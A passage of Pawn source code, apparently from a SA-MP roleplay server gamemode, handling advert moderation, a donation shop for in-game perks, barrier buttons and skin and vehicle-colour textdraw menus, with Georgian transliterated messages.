			format(mes,sizeof(mes),"%s\n1.Reklamireba\n2.Redaqtireba\n3.Washla Da Administraciastan Gagzavna\n4.Washla",gAdvert[listitem][adText]);
			ShowPlayerDialog(playerid,dAdvertAction,2,gAdvert[listitem][adSender],mes,"OK","CLOSE");
		}
		case dAdvertAction:
		{
			new id = GetPVarInt(playerid,"editadvert");
			if(!response)
			{
				gAdvert[id][adCheking] = false;
				return ShowAdvertList(playerid);
			}
			switch(listitem)
			{
				case 1:
				{
					format(gAdvert[id][adCheker],MAX_PLAYER_NAME,"%s",Name2(playerid));
					gAdvert[id][adCheking] = false;
					gAdvert[id][adCheked] = true;
					for(new i;i<MAX_ADVERT_COUNT;i++)
					{
						if(gAdvert[i][adCheked])
						{
							gNewsMoney += gAdvert[i][adMoney];
							SaveNewsMoney();
							format(mes,sizeof(mes),"Reklama: %s. Avtori: %s (Tel. %d)",gAdvert[i][adText],gAdvert[i][adSender],gAdvert[i][adPhone]);
							SendClientMessageToAll(CGREEN,mes);
							format(mes,sizeof(mes),"\t\t\t\tRedaktori: %s",gAdvert[i][adCheker]);
							SendClientMessageToAll(CGREEN,mes);
							strdel(gAdvert[i][adSender],0,24);
							gAdvert[i][adPhone] = 0;
							strdel(gAdvert[i][adText],0,100);
							strdel(gAdvert[i][adCheker],0,24);
							gAdvert[i][adBusy] = false;
							gAdvert[i][adCheked] = false;
							gAdvert[i][adCheking] = false;
							if(gAdvertCount > 0) gAdvertCount--;
						}
					}
					ShowAdvertList(playerid);
				}
				case 2:
				{
					ShowPlayerDialog(playerid,dAdvertEdit,1,gAdvert[id][adSender],gAdvert[id][adText],"OK","CLOSE");
				}
				case 3:
				{
					format(mes,sizeof(mes),"[AD] %s:%s",gAdvert[id][adSender],gAdvert[id][adText]);
					AdminChat(CYELLOW,mes);
					SendClientMessage(playerid,CYELLOW,mes);
					strdel(gAdvert[id][adSender],0,24);
					gAdvert[id][adPhone] = 0;
					strdel(gAdvert[id][adText],0,100);
					strdel(gAdvert[id][adCheker],0,24);
					gAdvert[id][adBusy] = false;
					gAdvert[id][adCheked] = false;
					gAdvert[id][adCheking] = false;
					if(gAdvertCount > 0) gAdvertCount--;
					ShowAdvertList(playerid);
				}
				case 4:
				{
					strdel(gAdvert[id][adSender],0,24);
					gAdvert[id][adPhone] = 0;
					strdel(gAdvert[id][adText],0,100);
					strdel(gAdvert[id][adCheker],0,24);
					gAdvert[id][adBusy] = false;
					gAdvert[id][adCheked] = false;
					gAdvert[id][adCheking] = false;
					if(gAdvertCount > 0) gAdvertCount--;
					ShowAdvertList(playerid);
				}
				default: {gAdvert[id][adCheking] = false; ShowAdvertList(playerid);}
			}
		}
		case dAdvertEdit:
		{
			new id = GetPVarInt(playerid,"editadvert");
			if(!response)
			{
				gAdvert[id][adCheking] = false;
				return ShowAdvertList(playerid);
			}
			format(gAdvert[id][adText],100,"%s",inputtext);
			format(gAdvert[id][adCheker],MAX_PLAYER_NAME,"%s",Name2(playerid));
			gAdvert[id][adCheking] = false;
			gAdvert[id][adCheked] = true;
			for(new i;i<MAX_ADVERT_COUNT;i++)
			{
				if(gAdvert[i][adCheked])
				{
					gNewsMoney += gAdvert[i][adMoney];
					SaveNewsMoney();
					format(mes,sizeof(mes),"Reklama: %s. Avtori: %s (Tel. %d)",gAdvert[i][adText],gAdvert[i][adSender],gAdvert[i][adPhone]);
					SendClientMessageToAll(CGREEN,mes);
					format(mes,sizeof(mes),"\t\t\t\tRedaktori: %s",gAdvert[i][adCheker]);
					SendClientMessageToAll(CGREEN,mes);
					strdel(gAdvert[i][adSender],0,24);
					gAdvert[i][adPhone] = 0;
					strdel(gAdvert[i][adText],0,100);
					strdel(gAdvert[i][adCheker],0,24);
					gAdvert[i][adBusy] = false;
					gAdvert[i][adCheked] = false;
					gAdvert[i][adCheking] = false;
					if(gAdvertCount > 0) gAdvertCount--;
				}
			}
			ShowAdvertList(playerid);
		}
		case dNewsDial:
		{
			if(!response) return true;
			if(GetPlayerMoneyEx(playerid) < gNewsDialPrice) return SendClientMessage(playerid,CGRAY,"Tqven Ar Gaqvt Sakmarisi Tanxa.");
			if(!gNewsDialing) return SendClientMessage(playerid,CGRAY,"Zarebi Ar Miigeba");
			if(gNewsDialee != INVALID_PLAYER_ID) return SendClientMessage(playerid,CGRAY,"Telefoni Dakavebulia");
			TransferMoney(playerid,-1,gNewsDialPrice);
			gNewsDialMoney += gNewsDialPrice;
			if(random(3)) return SendClientMessage(playerid,CGRAY,"Ar Mushaobs.");
			SendClientMessage(playerid,CGREEN,"Tqven Etershi Xart");
			SendClientMessage(gNewsDialer,CGREEN,"Motamashe Rekavs");
			SetPlayerSpecialAction(playerid,SPECIAL_ACTION_USECELLPHONE);
			SetPlayerAttachedObject(playerid,0,330,6);
			gNewsDialee = playerid;
		}
		case dDonate:
		{
			if(!response) return true;
			switch(listitem)
			{
				case 0: //Игровая валюта
				{
					ShowPlayerDialog(playerid,dDonateMoney1,1,"Donate","{"#cWHITE"}Miutitet Tanxa, Ramdenic Gsurt Rom Iyidot (Satamasho Valutashi).\n{"#cGREEN"}$50000 {"#cWHITE"}= {"#cRED"}1GEL.","NEXT","CLOSE");
				}
				case 1: //Saxelis Shecvla
				{
				    if(pData[playerid][pLevel] < 3) return SendClientMessage(playerid,CGRAY,"Unda Iyo 3LVL");
					if(pData[playerid][pDonate] < 50)
					{
						OnPlayerCommandText(playerid,"/donate");
						return SendClientMessage(playerid,CGRAY,"Tqven Unda Gqondet 50 Donate Money Angarishze, Rom Sheicvalot Saxeli.");
					}
					ShowPlayerDialog(playerid,dDonateNickname1,1,"Saxelis Shecvla","{"#cWHITE"}Miutitet Saxeli, Romelic Gsurt Rom Iyidot:","NEXT","CLOSE");
				}
				case 2:
				{
				    if(pData[playerid][pDonate] < 10)
					{
						OnPlayerCommandText(playerid,"/donate");
						return SendClientMessage(playerid,CGRAY,"Tqven Unda Gqondet 10 Donate Money Angarishze, Rom Sheicvalot Sqesi.");
     				}
					if(pData[playerid][pSex] == 2) pData[playerid][pSex] = 1;
					else pData[playerid][pSex] = 2;
					pData[playerid][pDonate] -= 10;
					new query[200];
					format(query,sizeof(query),"UPDATE `members` SET `sex` = '%d', donate = '%d' WHERE `nickname` = '%s'",pData[playerid][pSex],pData[playerid][pDonate],Name2(playerid));
					mysql_empty(mysql, query);
					if(mysql_errno()) return SendClientMessage(playerid,CRED,"Shecdoma MySQL");
					DonateLog(playerid,-10,12);
					SendClientMessage(playerid,CGREEN,"Tqven Sheicvalet Sqesi, Skinis Yidva Shegidzliat Tansacmlis Magaziashi.");
				}
				case 3: //Смена возраста
				{
					if(pData[playerid][pDonate] < 100)
					{
						OnPlayerCommandText(playerid,"/donate");
						return SendClientMessage(playerid,CGRAY,"Tqven Unda Gqondet 100 Donate Money Angarishze, Rom Sheicvalot Asaki.");
					}
					ShowPlayerDialog(playerid,dDonateAge1,1,"Asakis Shecvla","{"#cWHITE"}Miutitet Sasurveli Asaki:","NEXT","CLOSE");
				}
				case 4: //Снятие варнов
				{
				    if(pData[playerid][pDonate] < 150)
					{
						OnPlayerCommandText(playerid,"/donate");
						return SendClientMessage(playerid,CGRAY,"Tqven Unda Gqondet 150 Donate Money Angarishze, Rom Moixsnat Gafrtxileba.");
					}
					if(pData[playerid][pWarn] < 1) return SendClientMessage(playerid,CGRAY,"Tqven Ar Gaqvt Gafrtxileba.");
					pData[playerid][pWarn] = 0;
					pData[playerid][pDonate] -= 150;
					new query[200];
					format(query,sizeof(query),"UPDATE `members` SET `warn` = '0', donate = '%d' WHERE `nickname` = '%s'",pData[playerid][pDonate],Name2(playerid));
					mysql_empty(mysql, query);
					if(mysql_errno()) return SendClientMessage(playerid,CRED,"Shecdoma MySQL");
					DonateLog(playerid,-150,11);
					SendClientMessage(playerid,CGREEN,"Yvela Gafrtxileba Mogexsnat.");
				}
				case 5: //Saswavlo Ganvitarebebi
				{
					if(pData[playerid][pDonate] < 150)
					{
						OnPlayerCommandText(playerid,"/donate");
						return SendClientMessage(playerid,CGRAY,"Tqven Unda Gqondet 150 Donate Money Angarishze, Rom Iyidot Saswavlo Ganvitarebebi.");
					}
					pData[playerid][pObraz1] = 100;
					pData[playerid][pObraz3] = 100;
					pData[playerid][pObraz4] = 100;
					pData[playerid][pDonate] -= 150;
					new query[400];
					format(query,sizeof(query),"UPDATE `members` SET `obraz1` = '100',`obraz3` = '100',`obraz4` = '100', donate = '%d' WHERE `nickname` = '%s'",pData[playerid][pDonate],Name2(playerid));
					mysql_empty(mysql, query);
					if(mysql_errno()) return SendClientMessage(playerid,CRED,"Shecdoma MySQL");
					DonateLog(playerid,-150,28);
					SendClientMessage(playerid,CGREEN,"Tqven Ganvitarebebi Gaxda Maximumi.");
				}
				case 6: //Gamdzleoba, Dzala
				{
					if(pData[playerid][pDonate] < 300)
					{
						OnPlayerCommandText(playerid,"/donate");
						return SendClientMessage(playerid,CGRAY,"Tqven Unda Gqondet 300 Donate Money Angarishze, Rom Iyidot Gamdzleoba Da Dzala.");
					}
					pData[playerid][pHunger] = 500;
					pData[playerid][pStamina] = 500;
					pData[playerid][pPower] = 500;
					pData[playerid][pDonate] -= 300;
					new query[700];
					format(query,sizeof(query),"UPDATE `members` SET `hunger` = '500',`stamina` = '500',`power` = '500', donate = '%d' WHERE `nickname` = '%s'",pData[playerid][pDonate],Name2(playerid));
					mysql_empty(mysql, query);
					if(mysql_errno()) return SendClientMessage(playerid,CRED,"Shecdoma MySQL");
					DonateLog(playerid,-300,31);
					SendClientMessage(playerid,CGREEN,"Tqveni Gamdzleoba Da Dzala Gaxda Maximaluri.");
				}
				case 7: //1000 Metals + 1500 Tyvia
				{
					if(pData[playerid][pDonate] < 100)
					{
						OnPlayerCommandText(playerid,"/donate");
						return SendClientMessage(playerid,CGRAY,"Tqven Unda Gqondet 100 Donate Money Angarishze, Rom Iyidot 1000 Metals + 1500 Tyvia.");
					}
					pData[playerid][pDonate] -= 100;
					pData[playerid][pGunAmount] += 1000;
					pData[playerid][pAmmo] += 1500;
					new query[250];
					format(query,sizeof(query),"UPDATE `members` SET `gunamount` = '%d',`ammo` = '%d', donate = '%d' WHERE `nickname` = '%s'",pData[playerid][pGunAmount],pData[playerid][pAmmo],pData[playerid][pDonate],Name2(playerid));
					mysql_empty(mysql, query);
					if(mysql_errno()) return SendClientMessage(playerid,CRED,"Shecdoma MySQL");
					DonateLog(playerid,-100,39);
					SendClientMessage(playerid,CGREEN,"Tqven Gadmogecat 1000 Metali Da 1500 Tyvia.");
				}
				case 8: //Iaragis Skilebi
				{
				    if(pData[playerid][pDonate] < 300)
					{
						OnPlayerCommandText(playerid,"/donate");
						return SendClientMessage(playerid,CGRAY,"Tqven Unda Gqondet 300 Donate Money Angarishze, Rom Iyidot Iaragis Skilebi.");
					}
					pData[playerid][pDonate] -= 300;
					pData[playerid][pPistol_Skill] = 10000;
					pData[playerid][pEagle_Skill] = 10000;
					pData[playerid][pShotGun_Skill] = 10000;
					pData[playerid][pMP5_Skill] = 10000;
					pData[playerid][pAK47_Skill] = 10000;
					pData[playerid][pM4_Skill] = 10000;
					pData[playerid][pSniper_Skill] = 10000;
					DonateLog(playerid,-300,50);
					SendClientMessage(playerid,CGREEN,"Tqven Gagiumjobesdat Iaragis Skilebi Maximalur Doneze.");

					new query[700];
					format(query,sizeof(query),"UPDATE `members` SET `Pistol_Skill` = '1000',`Eagle_Skill` = '1000',`ShotGun_Skill` = '1000',`MP5_Skill` = '1000',`AK47_Skill` = '1000',`M4_Skill` = '1000',`Sniper_Skill` = '1000', donate = '%d' WHERE `nickname` = '%s'",pData[playerid][pDonate],Name2(playerid));
					mysql_empty(mysql, query);
					if(mysql_errno()) return SendClientMessage(playerid,CRED,"Shecdoma MySQL");
				}
				case 9:
				{
				    new ima[MAX_PLAYER_NAME], query[256];
					GetPlayerName(playerid, ima, sizeof(ima));
					format(query, sizeof(query),"SELECT `itemsCount` FROM `unitpay_payments` WHERE `account` = '%s' AND status = '1'",ima);
					mysql_tquery(mysql, query, "mysql_itemsCount", "ds", playerid, ima);
				}
				case 10: //Balance
				{
					format(mes,sizeof(mes),"Tqven Donate Angarishzea: {"#cWHITE"}%d {739F95}DM.",pData[playerid][pDonate]);
					SendClientMessage(playerid,CINFO5,mes);
					OnPlayerCommandText(playerid,"/donate");
				}
			}
		}
		case dDonateMoney1:
		{
			if(!response) return OnPlayerCommandText(playerid,"/donate");
			if(!isNumeric(inputtext) || !strlen(inputtext)) return ShowPlayerDialog(playerid,dDonateMoney1,1,"Donate","{"#cWHITE"}Miutitet Tanxa, Ramdenic Gsurt Rom Iyidot (Satamasho Valutashi).\n{"#cGREEN"}$50000 {"#cWHITE"}= {"#cRED"}1GEL.","NEXT","CLOSE");
			new amount = strval(inputtext);
			new money = (amount / 500);
			if(amount < 500)
			{
				ShowPlayerDialog(playerid,dDonateMoney1,1,"Donate","{"#cWHITE"}Miutitet Tanxa, Ramdenic Gsurt Rom Iyidot (Satamasho Valutashi).\n{"#cGREEN"}$50000 {"#cWHITE"}= {"#cRED"}1GEL.","NEXT","CLOSE");
				return SendClientMessage(playerid,CGRAY,"Minimaluri Tanxa: $500");
			}
			if(amount > 90000000)
			{
				ShowPlayerDialog(playerid,dDonateMoney1,1,"Donate","{"#cWHITE"}Miutitet Tanxa, Ramdenic Gsurt Rom Iyidot (Satamasho Valutashi).\n{"#cGREEN"}$50000 {"#cWHITE"}= {"#cRED"}1GEL.","NEXT","CLOSE");
				return SendClientMessage(playerid,CGRAY,"Maximaluri Tanxa: $90000000");
			}
			if(pData[playerid][pDonate] < money)
			{
				ShowPlayerDialog(playerid,dDonateMoney1,1,"Donate","{"#cWHITE"}Miutitet Tanxa, Ramdenic Gsurt Rom Iyidot (Satamasho Valutashi).\n{"#cGREEN"}$50000 {"#cWHITE"}= {"#cRED"}1 DM.","NEXT","CLOSE");
				return SendClientMessage(playerid,CGRAY,"Tqven Ar Gaqvt Sakmarisi Tanxa Donate Angarishze.");
			}
			SetPVarInt(playerid,"donatemoney",money);
			SetPVarInt(playerid,"donateamount",amount);
			format(mes,sizeof(mes),"{"#cWHITE"}Iqneba Moxsnili: %d GEL\nIqneba Charicxuli: $%d\nDarcha Donate Angarishze: %d GEL",money,amount,pData[playerid][pDonate] - money);
			ShowPlayerDialog(playerid,dDonateMoney2,0,"Donate",mes,"OK","CLOSE");
		}
		case dDonateMoney2:
		{
			if(!response) return OnPlayerCommandText(playerid,"/donate");
			new money = GetPVarInt(playerid,"donatemoney");
			new amount = GetPVarInt(playerid,"donateamount");
			DeletePVar(playerid,"donatemoney");
			DeletePVar(playerid,"donateamount");
			if(amount < 500)
			{
				ShowPlayerDialog(playerid,dDonateMoney1,1,"Donate","{"#cWHITE"}Miutitet Tanxa, Ramdenic Gsurt Rom Iyidot (Satamasho Valutashi).\n{"#cGREEN"}$50000 {"#cWHITE"}= {"#cRED"}1GEL.","NEXT","CLOSE");
			}
			UpdateDonate(playerid);
			if(pData[playerid][pDonate] < money) return SendClientMessage(playerid,CGRAY,"Tqven Ar Gaqvt Sakmarisi Tanxa Donate Angarishze.");
			pData[playerid][pDonate] -= money;
			if(UpdatePlayerData(playerid,"donate",pData[playerid][pDonate]))
			{
				pData[playerid][pDonate] += money;
				return SendClientMessage(playerid,CRED,"Shecdoma MySQL (Donate)");
			}
			TransferMoney(-1,playerid,amount);
			DonateLog(playerid,-money,7);
			format(mes,sizeof(mes),"%d {"#cINFO"}GEL Gadavida {"#cWHITE"}%d {"#cINFO"} Satamasho Tanxashi",money,amount);
			SendClientMessage(playerid,CWHITE,mes);
			OnPlayerCommandText(playerid,"/donate");
		}
		case dDonateNickname1:
		{
			if(!response) return OnPlayerCommandText(playerid,"/donate");
			if(pData[playerid][pDonate] < 50)
			{
				OnPlayerCommandText(playerid,"/donate");
				return SendClientMessage(playerid,CGRAY,"Shen Unda Gqondes 50 Donate Money Angarishze, Rom Shecvalo Motamashis Saxeli");
			}
			if(strlen(inputtext) < 3 || strlen(inputtext) > 20)
			{
				OnPlayerCommandText(playerid,"/donate");
				return SendClientMessage(playerid,CGRAY,"Saxelis Sigrdze Ar Unda Sheicavdes 3-Ze Nakleb Da 20-Ze Met Simbolos");
			}
			if(strfind(inputtext,"|") != -1) return SendClientMessage(playerid,CGRAY,"Saxelshi Ar Unda Iyos Shemdegi Simboloebi: \"|\"");
			new str[64];
			mysql_real_escape_string(inputtext,str);
			new query[128];
			format(query,sizeof(query),"SELECT `nickname` FROM `members` WHERE `nickname` = '%s'",str);
			mysql_tquery(mysql, query, "mysql_dDonateNickname1", "ds", playerid, str);
		}
		case dDonateNickname2:
		{
			if(!response) return OnPlayerCommandText(playerid,"/donate");
			UpdateDonate(playerid);
			if(pData[playerid][pDonate] < 50)
			{
				OnPlayerCommandText(playerid,"/donate");
				return SendClientMessage(playerid,CGRAY,"Shen Unda Gqondes 50 Donate Money Angarishze, Rom Shecvalo Motamashis Saxeli");
			}
			new nickname[24];
			GetPVarString(playerid,"nnick",nickname,24);
			DeletePVar(playerid,"nnick");
			if(strlen(nickname) < 3 || strlen(nickname) > 20)
			{
				OnPlayerCommandText(playerid,"/donate");
				return SendClientMessage(playerid,CGRAY,"Saxelis Sigrdze Ar Unda Sheicavdes 3-Ze Nakleb Da 20-Ze Met Simbolos");
			}
			if(strfind(nickname,"|") != -1) return SendClientMessage(playerid,CGRAY,"Saxelshi Ar Unda Iyos Shemdegi Simboloebi: \"|\"");
			mysql_real_escape_string(nickname,nickname);
			new query[128];
			format(query,sizeof(query),"SELECT `nickname` FROM `members` WHERE `nickname` = '%s'",nickname);
			mysql_tquery(mysql, query, "mysql_dDonateNickname2", "ds", playerid, nickname);
		}
		case dDonateAge1:
		{
			if(!response) return OnPlayerCommandText(playerid,"/donate");
			if(pData[playerid][pDonate] < 100)
			{
				OnPlayerCommandText(playerid,"/donate");
				return SendClientMessage(playerid,CGRAY,"Shen Unda Gqondes 100 Donate Money Angarishze, Rom Shecvalo Motamashis Asaki");
			}
			if(!isNumeric(inputtext) || !strlen(inputtext)) ShowPlayerDialog(playerid,dDonateAge1,1,"Asakis Shecvla","{"#cWHITE"}Sheikvane Sasurveli Asaki:","NEXT","CLOSE");
			new age = strval(inputtext);
			if(age < 16 || age > 110)
			{
				SendClientMessage(playerid,CGRAY,"Asaki Ar Sheidzleba Ikos Naklebi 16-Ze Da Meti 110-Ze");
				return OnPlayerCommandText(playerid,"/donate");
			}
			SetPVarInt(playerid,"donateage",age);
			format(mes,sizeof(mes),"{"#cWHITE"}\tAsaki Sheicvala\n\nAxali Motamashis Wlovaneba: %d\nChamogechreba: 3GEL\nMimdinare Balansi Donate Angarishze: %d GEL\n\t{"#cYELLOW"}Gaagrdzelebt?",age,pData[playerid][pDonate] - 100);
			ShowPlayerDialog(playerid,dDonateAge2,0,"Смена возраста",mes,"Да","Нет");
		}
		case dDonateAge2:
		{
			if(!response) return OnPlayerCommandText(playerid,"/donate");
			if(pData[playerid][pDonate] < 100)
			{
				OnPlayerCommandText(playerid,"/donate");
				return SendClientMessage(playerid,CGRAY,"Shen Unda Gqondes 100 Donate Money Angarishze, Rom Shecvalo Motamashis Asaki");
			}
			new age = GetPVarInt(playerid,"donateage");
			if(age < 16 || age > 110)
			{
				SendClientMessage(playerid,CGRAY,"Asaki Ar Sheidzleba Ikos Naklebi 16-Ze Da Meti 110-Ze");
				return OnPlayerCommandText(playerid,"/donate");
			}
			pData[playerid][pAge] = age;
			pData[playerid][pDonate] -= 100;
			new query[200];
			format(query,sizeof(query),"UPDATE `members` SET `age` = '%d', donate = '%d' WHERE `nickname` = '%s'",age,pData[playerid][pDonate],Name2(playerid));
			mysql_empty(mysql, query);
			if(mysql_errno()) return SendClientMessage(playerid,CRED,"Shecdoma MySQL");
			DonateLog(playerid,-100,10);
			SendClientMessage(playerid,CGREEN,"Motamashis Saxeli Sheicvala");
		}
	}
	return false;
}

public OnPlayerClickPlayer(playerid, clickedplayerid, source) return true;
public OnVehicleDamageStatusUpdate(vehicleid, playerid) return true;
public OnPlayerPickUpDynamicPickup(playerid, pickupid) return true;
public OnPlayerPressButton(playerid,buttonid)
{
	if(buttonid == gBarrierButton[2])
	{
		if(pData[playerid][pFraction] != 8) return SendClientMessage(playerid,CGRAY,"Es Funqcia Xelmisawvdomia Mxolod: Armiistvis");
		MoveDynamicObject(gBarrier[2],462.21, 2540.05, 11.31, 1.0);
		MoveDynamicObject(gBarrier[3],466.81, 2546.64, 11.31, 1.0);
		SetTimerEx("CloseBarrier",10000,false,"i",2);
	}
	if(buttonid == gBarrierButton[0])
	{
		if(pData[playerid][pFraction] != 8) return SendClientMessage(playerid,CGRAY,"Es Funqcia Xelmisawvdomia Mxolod: Armiistvis");
		MoveDynamicObject(gBarrier[0],346.70, 1799.90, 18.10,0.02,0.00, 0.00, 34.00);
		SetTimerEx("CloseBarrier",10000,false,"i",0);
	}
	//if(buttonid == gBarrierButton[3])
	//{
//		if(pData[playerid][pFraction] != 9 || pData[playerid][pSubfraction] != 1) return SendClientMessage(playerid,CGRAY,"Es Funqcia Xelmisawvdomia Mxolod: LSPD");
//		MoveDynamicObject(gBarrier[4],1544.69, -1630.72, 13.073,0.001,0.00, 25.00, 90.00);
//		SetTimerEx("CloseBarrier",10000,false,"i",3);
//	}
	if(buttonid == gBarrierButton[4])
	{
		if(pData[playerid][pFraction] != 9 || pData[playerid][pSubfraction] != 2) return SendClientMessage(playerid,CGRAY,"Es Funqcia Xelmisawvdomia Mxolod: SFPD");
		MoveDynamicObject(gBarrier[5],-1572.20, 658.76, 6.763,0.001,0.00, 0.00, 90.00);
		SetTimerEx("CloseBarrier",10000,false,"i",4);
	}
	if(buttonid == gBarrierButton[5])
	{
		if(pData[playerid][pFraction] != 9 || pData[playerid][pSubfraction] != 2) return SendClientMessage(playerid,CGRAY,"Es Funqcia Xelmisawvdomia Mxolod: SFPD");
		MoveDynamicObject(gBarrier[6],-1701.43, 687.70, 24.593,0.001,0.00, 0.00, 90.00);
		SetTimerEx("CloseBarrier",10000,false,"i",5);
	}
	if(buttonid == gBarrierButton[6])
	{
		if(pData[playerid][pFraction] != 8) return SendClientMessage(playerid,CGRAY,"Es Funqcia Xelmisawvdomia Mxolod: Armiistvis");
		MoveDynamicObject(gBarrier[7],141.80, 1965.30, 19.303, 0.001,  0.00, 345.0, 0.00);
		SetTimerEx("CloseBarrier",10000,false,"i",6);
	}
	return true;
}
public OnPlayerClickTextDraw(playerid, Text:clickedid)
{
	if(clickedid == Statistic[s1SkinPlayer])
	{
	    if(pData[playerid][pSex] == 1) SetPlayerSkin(playerid,7);
	    else SetPlayerSkin(playerid,12);
	}
	if(clickedid == Statistic[SkinPlayer1])
	{
	    if(pData[playerid][pSex] == 1) SetPlayerSkin(playerid,22);
	    else SetPlayerSkin(playerid,193);
	}
	if(clickedid == Statistic[SkinPlayer2])
	{
	    if(pData[playerid][pSex] == 1) SetPlayerSkin(playerid,3);
	    else SetPlayerSkin(playerid,40);
	}
	if(clickedid == Statistic[SkinPlayer3])
	{
	    if(pData[playerid][pSex] == 1) SetPlayerSkin(playerid,23);
	    else SetPlayerSkin(playerid,41);
	}
	if(clickedid == Statistic[SkinPlayer4])
	{
	    if(pData[playerid][pSex] == 1) SetPlayerSkin(playerid,47);
	    else SetPlayerSkin(playerid,69);
	}
	if(clickedid == Statistic[SkinPlayer5])
	{
	    if(pData[playerid][pSex] == 1) SetPlayerSkin(playerid,101);
	    else SetPlayerSkin(playerid,56);
	}
	if(clickedid == Statistic[SkinPlayer8])
	{
	    pData[playerid][pSkin] = GetPlayerSkin(playerid);
		UpdatePlayerData(playerid,"skin",pData[playerid][pSkin]);
		TextDrawHideForPlayer(playerid,Statistic[s1SkinPlayer]);
		TextDrawHideForPlayer(playerid,Statistic[SkinPlayer1]);
		TextDrawHideForPlayer(playerid,Statistic[SkinPlayer2]);
		TextDrawHideForPlayer(playerid,Statistic[SkinPlayer3]);
		TextDrawHideForPlayer(playerid,Statistic[SkinPlayer4]);
		TextDrawHideForPlayer(playerid,Statistic[SkinPlayer5]);
		TextDrawHideForPlayer(playerid,Statistic[SkinPlayer6]);
		TextDrawHideForPlayer(playerid,Statistic[SkinPlayer7]);
		TextDrawHideForPlayer(playerid,Statistic[SkinPlayer8]);
		TextDrawHideForPlayer(playerid,Statistic[SkinPlayer9]);
		TextDrawHideForPlayer(playerid,Statistic[SkinPlayer10]);
		TextDrawHideForPlayer(playerid,Statistic[SkinPlayer11]);
		TextDrawHideForPlayer(playerid,Statistic[SkinPlayer12]);
		TextDrawHideForPlayer(playerid,Statistic[SkinPlayer13]);
		CancelSelectTextDraw(playerid);
		SetPlayerVirtualWorld(playerid,0);
		TogglePlayerControllable(playerid,1);
		SpawnPlayer(playerid);
	}
    if(clickedid == ColorTD[5])
	{
	    PlayerTextDrawHide(playerid,ColorTDPl[playerid][1]);
	    PlayerTextDrawColor(playerid,ColorTDPl[playerid][1],RGBArray[PrimaryColor[playerid]]);
	    PlayerTextDrawShow(playerid,ColorTDPl[playerid][1]);
	    PrimaryColor[playerid]++;
	    if(PrimaryColor[playerid] > 255) PrimaryColor[playerid] = 0;
	    PlayerTextDrawHide(playerid,ColorTDPl[playerid][2]);
	    PlayerTextDrawColor(playerid,ColorTDPl[playerid][2],RGBArray[PrimaryColor[playerid]]);
	    PlayerTextDrawShow(playerid,ColorTDPl[playerid][2]);
	    new curcol = PrimaryColor[playerid]+1;
	    if(curcol > 255) curcol = 0;
	    PlayerTextDrawHide(playerid,ColorTDPl[playerid][3]);
	    PlayerTextDrawColor(playerid,ColorTDPl[playerid][3],RGBArray[curcol]);
	    PlayerTextDrawShow(playerid,ColorTDPl[playerid][3]);
	    if(PrimaryColor[playerid] == pData[playerid][pColor1])
		{
		    new str[32];
			RepaintValue[playerid] -= PAINT_VALUE;
			ChangedPrimaryColor[playerid] = false;
			format(str,32,"$%d",RepaintValue[playerid]);
			PlayerTextDrawSetString(playerid,ColorTDPl[playerid][0],str);
		}
	    else if(!ChangedPrimaryColor[playerid])
	    {
	        new str[32];
	        ChangedPrimaryColor[playerid] = true;
	        RepaintValue[playerid] += PAINT_VALUE;
	        format(str,32,"$%d",RepaintValue[playerid]);
			PlayerTextDrawSetString(playerid,ColorTDPl[playerid][0],str);
		}
		ChangeVehicleColor(GetPlayerVehicleID(playerid),PrimaryColor[playerid],SecondaryColor[playerid]);
	    return true;
	}
	if(clickedid == ColorTD[6])
	{
	    PlayerTextDrawHide(playerid,ColorTDPl[playerid][3]);
	    PlayerTextDrawColor(playerid,ColorTDPl[playerid][3],RGBArray[PrimaryColor[playerid]]);
	    PlayerTextDrawShow(playerid,ColorTDPl[playerid][3]);
	    PrimaryColor[playerid]--;
	    if(PrimaryColor[playerid] < 0) PrimaryColor[playerid] = 255;
	    PlayerTextDrawHide(playerid,ColorTDPl[playerid][2]);
	    PlayerTextDrawColor(playerid,ColorTDPl[playerid][2],RGBArray[PrimaryColor[playerid]]);
	    PlayerTextDrawShow(playerid,ColorTDPl[playerid][2]);
	    new curcol = PrimaryColor[playerid]-1;
	    if(curcol < 0) curcol = 255;
	    PlayerTextDrawHide(playerid,ColorTDPl[playerid][1]);
	    PlayerTextDrawColor(playerid,ColorTDPl[playerid][1],RGBArray[curcol]);
	    PlayerTextDrawShow(playerid,ColorTDPl[playerid][1]);
	    if(PrimaryColor[playerid] == pData[playerid][pColor1])
		{
		    new str[32];
			RepaintValue[playerid] -= PAINT_VALUE;
			ChangedPrimaryColor[playerid] = false;
			format(str,32,"$%d",RepaintValue[playerid]);
			PlayerTextDrawSetString(playerid,ColorTDPl[playerid][0],str);
		}
	    else if(!ChangedPrimaryColor[playerid])
	    {
	        new str[32];
	        ChangedPrimaryColor[playerid] = true;
	        RepaintValue[playerid] += PAINT_VALUE;
	        format(str,32,"$%d",RepaintValue[playerid]);
			PlayerTextDrawSetString(playerid,ColorTDPl[playerid][0],str);
		}
		ChangeVehicleColor(GetPlayerVehicleID(playerid),PrimaryColor[playerid],SecondaryColor[playerid]);
	    return true;
	}
	if(clickedid == ColorTD[7])
	{
	    PlayerTextDrawHide(playerid,ColorTDPl[playerid][4]);
	    PlayerTextDrawColor(playerid,ColorTDPl[playerid][4],RGBArray[SecondaryColor[playerid]]);
	    PlayerTextDrawShow(playerid,ColorTDPl[playerid][4]);
	    SecondaryColor[playerid]++;
	    if(SecondaryColor[playerid] > 255) SecondaryColor[playerid] = 0;
	    PlayerTextDrawHide(playerid,ColorTDPl[playerid][5]);
	    PlayerTextDrawColor(playerid,ColorTDPl[playerid][5],RGBArray[SecondaryColor[playerid]]);
	    PlayerTextDrawShow(playerid,ColorTDPl[playerid][5]);
	    new curcol = SecondaryColor[playerid]+1;
	    if(curcol > 255) curcol = 0;
	    PlayerTextDrawHide(playerid,ColorTDPl[playerid][6]);
	    PlayerTextDrawColor(playerid,ColorTDPl[playerid][6],RGBArray[curcol]);
	    PlayerTextDrawShow(playerid,ColorTDPl[playerid][6]);
	    if(SecondaryColor[playerid] == pData[playerid][pColor2])
		{
		    new str[32];
			RepaintValue[playerid] -= PAINT_VALUE;
			ChangedSecondaryColor[playerid] = false;
			format(str,32,"$%d",RepaintValue[playerid]);
			PlayerTextDrawSetString(playerid,ColorTDPl[playerid][0],str);
		}
	    else if(!ChangedSecondaryColor[playerid])
	    {
	        new str[32];
	        ChangedSecondaryColor[playerid] = true;
	        RepaintValue[playerid] += PAINT_VALUE;
	        format(str,32,"$%d",RepaintValue[playerid]);
			PlayerTextDrawSetString(playerid,ColorTDPl[playerid][0],str);
		}
		ChangeVehicleColor(GetPlayerVehicleID(playerid),PrimaryColor[playerid],SecondaryColor[playerid]);
	    return true;
	}
